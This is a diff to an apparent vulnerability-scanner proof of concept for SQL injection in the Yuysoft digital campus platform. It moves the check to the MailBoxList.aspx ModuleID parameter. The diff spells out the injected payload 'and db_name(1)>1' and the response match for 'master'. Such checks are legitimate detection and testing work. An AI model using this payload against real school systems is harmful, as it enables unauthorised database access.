@@ -6,25 +6,25 @@ import re
 
 
 class Vuln(ABVuln):
-    vuln_id = 'Yuysoft_0002'  # 平台漏洞编号，留空
+    vuln_id = 'Yuysoft_0001'  # 平台漏洞编号，留空
     name = '育友通用数字化校园平台 SQL注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
     type = VulnType.INJECTION  # 漏洞类型
-    disclosure_date = '2015-04-03'  # 漏洞公布时间
+    disclosure_date = '2015-04-02'  # 漏洞公布时间
     desc = '''
         育友通用数字化校园平台采用分布式权限管理，将整个信息平台的大量的信息维护任务，分配到各科室、个人，既调动了全体教师的使用热情，又可及时、高效的更新大量的信息。
         育友通用数字化校园平台 SQL注入漏洞：
-        /IneduPortal/Components/WeekCalendar/PrintWeekCalendar.aspx?termid=2014-2015-1
+        '/IneduPortal/Components/mailbox/MailBoxList.aspx?ModuleID=796'
     '''  # 漏洞描述
-    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=105449'  # 漏洞来源
+    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=105373'  # 漏洞来源
     cnvd_id = 'Unknown'  # cnvd漏洞编号
     cve_id = 'Unknown'  # cve编号
-    product = '育友通用数字化校园平台'  # 漏洞应用名称
+    product = '育友数字化校园平台'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
 
 
 class Poc(ABPoc):
-    poc_id = '526dc865-940f-4f4b-8ddd-73b4d7be2b5a'
+    poc_id = 'ce276cb8-5f9c-424e-a897-d2f0d4f0485d'
     author = '47bwy'  # POC编写者
     create_date = '2018-05-11'  # POC创建时间
 
@@ -51,9 +51,9 @@ class Poc(ABPoc):
                 target=self.target, vuln=self.vuln))
 
             hh = hackhttp.hackhttp()
-            payload2 = '/IneduPortal/Components/WeekCalendar/PrintWeekCalendar.aspx?termid=2014-2015-1'
-            get = '%27%20and%20db_name(1)%3E1--'
-            verify_url = self.target + payload2 + get
+            payload1 = '/IneduPortal/Components/mailbox/MailBoxList.aspx?ModuleID=796'
+            get = '%20and%20db_name(1)%3E1'
+            verify_url = self.target + payload1 + get
             code, head, res, errcode, _ = hh.http(verify_url)
             m = re.search('master', res)
 
